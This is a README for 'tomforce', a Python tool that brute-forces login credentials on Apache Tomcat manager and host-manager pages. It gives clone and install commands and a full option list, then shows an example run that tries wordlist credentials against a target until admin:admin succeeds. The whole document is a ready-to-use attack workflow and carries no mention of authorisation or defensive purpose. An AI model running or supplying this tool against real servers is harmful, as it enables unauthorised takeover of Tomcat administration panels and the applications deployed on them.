# Tomcat Manager Credential Bruteforcing

# Usage

```bash
git clone https://github.com/v1ru6/tomforce.git
pip3 install termcolor
```
```bash
python3 tomforce.py

options:  

-h, --help                              show this help message and exit
-U URL, --url URL                       Base URL to the Tomcat page (e.g., http://target.com)
-P PATH, --path PATH                    Manager or host-manager URI (e.g., /host-manager/html)
-u USERNAMES, --usernames USERNAMES     Path to file containing usernames
-p PASSWORDS, --passwords PASSWORDS     Path to file containing passwords
-v, --verbose                           Enable verbose output to see attempted credentials and encoded values
-r RATE_LIMIT, --rate-limit RATE_LIMIT  Delay in seconds between requests (e.g., 0.5 for half a second)
```
                        
# Example

```bash
python3 tomforce.py -U https://example.com -P /host-manager -u usernames.txt -p passwords.txt -v

[+] Starting Brute-force Attack...                                                                        
[*] Trying root:123456 → Encoded: cm9vdDoxMjM0NTY= → HTTP 401                                                                
[*] Trying root:admin → Encoded: cm9vdDphZG1pbg== → HTTP 401                                                                 
[*] Trying root:12345678 → Encoded: cm9vdDoxMjM0NTY3OA== → HTTP 401                                                          
[*] Trying root:123456789 → Encoded: cm9vdDoxMjM0NTY3ODk= → HTTP 401                                                         
[*] Trying root:1234 → Encoded: cm9vdDoxMjM0 → HTTP 401                                                                                                                          
[*] Trying root:111111 → Encoded: cm9vdDoxMTExMTE= → HTTP 401                                                                
[*] Trying root:Password → Encoded: cm9vdDpQYXNzd29yZA== → HTTP 401
[*] Trying admin:password → Encoded: YWRtaW46cGFzc3dvcmQ= → HTTP 401
[*] Trying admin:Password1 → Encoded: YWRtaW46UGFzc3dvcmQx → HTTP 401
[*] Trying admin:password1 → Encoded: YWRtaW46cGFzc3dvcmQx → HTTP 401
[*] Trying admin:admin → Encoded: YWRtaW46YWRtaW4= → HTTP 403

[+] Success!
[+] Username: admin
[+] Password: admin
[+] Encoded: YWRtaW46YWRtaW4=
```
